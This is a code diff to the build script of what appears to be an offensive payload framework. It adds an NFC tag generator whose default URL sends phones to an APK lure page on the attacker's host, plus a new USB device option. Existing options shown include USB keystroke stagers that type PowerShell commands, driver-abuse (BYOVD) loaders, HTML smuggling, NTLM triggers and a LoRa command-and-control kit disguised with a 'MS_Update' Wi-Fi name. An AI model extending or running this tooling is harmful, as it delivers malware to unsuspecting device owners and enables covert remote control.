@@ -96,7 +96,7 @@ BUILD FLAGS
                           • Raspberry Pi Pico/CircuitPython (code.py)
                           • DigiSpark ATtiny85 (payload_digispark.ino)
                           • Plugs in, opens PowerShell, types stager, exits (~9–17s)
-    --usb-device TYPE   duck | pico | digispark | all  (default: all)
+    --usb-device TYPE   duck | pico | digispark | teembed | all  (default: all)
     --usb-boot-delay MS USB enumeration + HID driver wait in ms  (default: 2000)
     --usb-out DIR       Output directory  (default: <workspace>/usb/)
 
@@ -312,6 +312,7 @@ from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
 from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES, build_android_ble_payload, ANDROID_DEVICES
 from builders.lora_c2  import build_lora_payload
+from builders.nfc_tag  import build_nfc_payload
 from builders.android  import build_android_payload
 from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
 from builders.ntlm_trigger import build_ntlm_triggers
@@ -719,6 +720,17 @@ def cmd_build(args, cfg, ws):
             freq_mhz    = lora_freq,
             serial_port = lora_serial,
         )
+        did_something = True
+
+    # ── NFC tag NDEF payload ──────────────────────────────────────────────────
+    if getattr(args, "nfc", False):
+        nfc_out  = getattr(args, "nfc_out", None) or ws.path("nfc")
+        nfc_url  = getattr(args, "nfc_url", None)
+        if not nfc_url:
+            scheme     = "https"
+            url_prefix = "/android/"
+            nfc_url    = f"{scheme}://{lhost}:{port}{url_prefix}"
+        build_nfc_payload(nfc_url, nfc_out)
         did_something = True
 
     # ── HTML Smuggling → ISO → LNK ────────────────────────────────────────────
@@ -1540,6 +1552,12 @@ def main():
                          help="Output directory for Android BLE payload (default: <workspace>/ble_android/)")
     build_p.add_argument("--android-out",        metavar="DIR",   dest="android_out",        default=None,
                          help="Output directory for Android server-side files (default: <workspace>/android/)")
+    build_p.add_argument("--nfc",          action="store_true", dest="nfc",
+                         help="Generate NFC tag NDEF binary for mobile delivery (default URL: https://lhost:port/android/)")
+    build_p.add_argument("--nfc-url",      metavar="URL",   dest="nfc_url",  default=None,
+                         help="Override NFC tag URL (default: Android APK lure page)")
+    build_p.add_argument("--nfc-out",      metavar="DIR",   dest="nfc_out",  default=None,
+                         help="Output directory for NFC tag files (default: <workspace>/nfc/)")
     build_p.add_argument("--lora",         action="store_true", dest="lora",
                          help="Generate LoRa C2 relay kit: T-Embed Plus WiFi AP + LoRa bridge + PS1 beacon loop")
     build_p.add_argument("--lora-ssid",    metavar="SSID",  dest="lora_ssid",   default="MS_Update",
